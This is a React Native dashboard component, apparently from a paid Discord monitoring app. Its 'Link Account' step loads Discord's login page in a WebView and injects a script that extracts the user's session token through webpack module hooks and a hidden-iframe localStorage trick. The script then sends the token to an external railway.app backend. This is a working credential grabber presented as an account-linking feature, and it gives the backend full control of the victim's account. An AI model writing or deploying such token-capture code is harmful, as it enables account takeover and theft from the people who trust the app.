import React, { useEffect, useRef, useState } from 'react';
import { View, Text, FlatList, TouchableOpacity, Alert, StyleSheet } from 'react-native';
import { WebView } from 'react-native-webview';
import * as Notifications from 'expo-notifications';

const API_URL = 'https://intelligent-gratitude-production.up.railway.app';

export default function Dashboard({ user, setUser }) {
  const [moves, setMoves] = useState([]);
  const [refreshing, setRefreshing] = useState(false);
  const [showWebView, setShowWebView] = useState(false);
  const [paystackUrl, setPaystackUrl] = useState(null);
  const webViewRef = useRef(null);
  const lastSeenId = useRef(null);

  // Use user's proven token-capture script (checks webpack + iframe restoration)
  const INJECTED_JAVASCRIPT = `
  (function() {
    function capture() {
      try {
        // 1. TRY THE "WEBPACK" HOOK (Most reliable for Discord 2025)
        const webpack = window.webpackChunkdiscord_app;
        if (webpack) {
          const m = webpack.push([[Symbol()], {}, (e) => e]);
          for (const i in m.c) {
            if (m.c[i].exports && m.c[i].exports.default && m.c[i].exports.default.getToken) {
              const token = m.c[i].exports.default.getToken();
              if (token && token.length > 20) {
                window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: token}));
                return true;
              }
            }
          }
        }

        // 2. TRY THE "IFRAME RESTORATION" HOOK
        // Discord deletes localStorage, but a new iframe can bring it back
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        const storage = iframe.contentWindow.localStorage;
        const token = storage.getItem('token');
        if (token) {
          const clean = token.replace(/"/g, '');
          window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: clean}));
          return true;
        }
      } catch (e) {}
      return false;
    }

    // Check every 500ms
    const timer = setInterval(() => {
      if (capture()) clearInterval(timer);
    }, 500);
  })();
`;

  useEffect(() => {
    if (user) fetchMoves();
  }, [user]);

  const fetchMoves = async () => {
    if (!user || !user._id) return;
    try {
      const res = await fetch(`${API_URL}/get-moves/${user._id}`);
      if (res.status === 402) return;
      const data = await res.json();
      if (Array.isArray(data)) {
        if (lastSeenId.current && data.length > 0 && data[0].id !== lastSeenId.current) {
          triggerNotification(data[0]);
        }
        if (data.length > 0) lastSeenId.current = data[0].id;
        setMoves(data);
      }
    } catch (e) {
      console.log('fetchMoves error', e);
    }
  };

  const triggerNotification = async (move) => {
    if (user.subscription_tier !== 'pro') return; // only notify pro
    await Notifications.scheduleNotificationAsync({ content: { title: `📥 New Member!`, body: move.action }, trigger: null });
  };

  const onWebViewMessage = async (e) => {
    try {
      const message = JSON.parse(e.nativeEvent.data);
      if (message.type === 'TOKEN' && message.data) {
        setShowWebView(false);
        await sendTokenToBackend(message.data);
      }
    } catch (err) {}
  };

  const sendTokenToBackend = async (token) => {
    try {
      const res = await fetch(`${API_URL}/link-account`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token, user_id: user._id }),
      });
      const data = await res.json();
      if (res.ok) {
        Alert.alert('Connected', 'Discord account linked');
      } else {
        Alert.alert('Failed', data.message || 'Could not link');
      }
    } catch (e) {
      Alert.alert('Error', 'Server unreachable');
    }
  };

  const handlePay = async () => {
    try {
      const res = await fetch(`${API_URL}/initialize-payment`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ user_id: user._id, email: user.email })
      });
      const data = await res.json();
      if (data && data.data && data.data.authorization_url) setPaystackUrl(data.data.authorization_url);
    } catch (e) { Alert.alert('Error', 'Payment init failed'); }
  };

  if (paystackUrl) return (
    <WebView source={{ uri: paystackUrl }} style={{ flex: 1 }} />
  );

  if (showWebView) return (
    <WebView ref={webViewRef} source={{ uri: 'https://discord.com/login' }} injectedJavaScript={INJECTED_JAVASCRIPT} onMessage={onWebViewMessage} />
  );

  return (
    <View style={{ flex: 1, padding: 16 }}>
      <View style={{ flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center' }}>
        <Text style={{ fontSize: 22, fontWeight: 'bold' }}>Live Feed</Text>
        <TouchableOpacity onPress={() => setShowWebView(true)}>
          <Text style={{ color: '#5865F2' }}>Link Account</Text>
        </TouchableOpacity>
      </View>
      <FlatList data={moves} keyExtractor={(i) => i.id} renderItem={({ item }) => (
        <View style={{ padding: 12, borderBottomWidth: 1, borderBottomColor: '#eee' }}>
          <Text style={{ fontWeight: '600' }}>{item.action}</Text>
          <Text style={{ color: '#666' }}>{new Date(item.timestamp).toLocaleString()}</Text>
        </View>
      )} />
      <TouchableOpacity style={{ marginTop: 12, backgroundColor: '#5865F2', padding: 12, borderRadius: 8 }} onPress={handlePay}>
        <Text style={{ color: '#fff', textAlign: 'center' }}>Upgrade / Renew</Text>
      </TouchableOpacity>
    </View>
  );
}
